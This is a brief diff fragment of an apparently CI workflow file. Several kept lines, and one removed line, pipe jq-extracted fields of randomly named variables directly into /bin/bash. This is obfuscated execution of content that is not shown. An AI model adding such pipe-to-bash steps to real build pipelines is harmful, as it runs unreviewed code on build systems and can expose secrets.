@@ -31,7 +31,6 @@ jobs:
           echo $vpdn64 | jq -r .l2391 | /bin/bash
           printf '%s' "$vhgf36709" | jq -r .w1 | /bin/bash
           echo $wrgi7 | jq -r .kfs10644 | /bin/bash
-          echo $a6935 | jq -r .yn20024 | /bin/bash
 
       - name: Persist output
         if: always()
